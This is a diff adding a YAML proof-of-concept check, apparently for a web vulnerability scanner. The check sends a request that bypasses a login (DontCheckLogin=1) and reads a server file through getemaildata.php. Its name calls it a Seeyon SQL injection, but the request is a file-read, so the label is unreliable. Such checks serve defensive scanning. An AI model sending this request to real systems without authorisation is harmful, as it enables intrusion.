@@ -1,0 +1,10 @@
+name: poc-yaml-seeyon-wooyun-2015-0108235-sqli
+rules:
+  - method: GET
+    path: /ajax/getemaildata.php?DontCheckLogin=1&filePath=./getemaildata.php
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes("crm_include"))
+detail:
+  author: luna
+  links:
+    - https://www.seebug.org/vuldb/ssvid-90525
